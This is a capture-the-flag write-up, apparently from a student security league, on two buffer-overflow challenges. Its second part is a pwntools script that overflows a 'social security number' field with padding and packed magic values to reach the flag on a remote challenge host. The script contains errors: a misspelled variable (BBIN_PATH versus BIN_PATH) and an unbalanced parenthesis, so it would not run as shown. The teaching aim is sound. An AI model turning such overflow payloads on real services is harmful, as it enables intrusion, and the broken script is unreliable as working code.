#ctf 

### PWN/BIN
# Smokey's Encore
#### 01222024

-----
## Part 1.

Using Ghidra to inspect the first binary, we can see that the program reads in more data that is allocated for the input storage variable. The next variable is later checked to be non-zero, and if this is met the flag is dropped. Sending in a large string (A * 30 or so) overflows this variable and prints out the flag.

## Part 2.

Part 2 has a similar vulnerability, but checks for specific bytes in specific places. We can overflow input again, but need a specific input. Math is hard so we can just use pwntool's `p32` function to load a our input with the specific bytes needed, as seen bellow:

```python
#!/usr/bin/env python3
# To run locally, just run this python program
# To run on remote, pass the string `REMOTE` as an argument

from pwn import *

BBIN_PATH = "sadfsadf"
HOST = "chal.ctf-league.osusec.org"
PORT = 1323


p = process(BIN_PATH) if not args.REMOTE else remote(HOST, PORT)

print(p.recvline()))
# recvlines removed for brevity
# pick option from menu
p.sendline(b'3')
# recvlines removed for brevity
#internet option
p.sendline(b'2')
# recvlines removed for brevity
#credit card input
p.sendline(b'1234')
print(p.recvline())
#social security number overflow
overflow =( b'A' * 104) + p32(0x1) + p32(0x1337) + p32(0xdeadbeef)  #<--- specific input
p.send(overflow)
print(p.recvline())
print(p.recvline()) #the flag

p.interactive()
```

This overloads the allocated memory for our "social security number" into the bits being evaluated before dumping the flag.
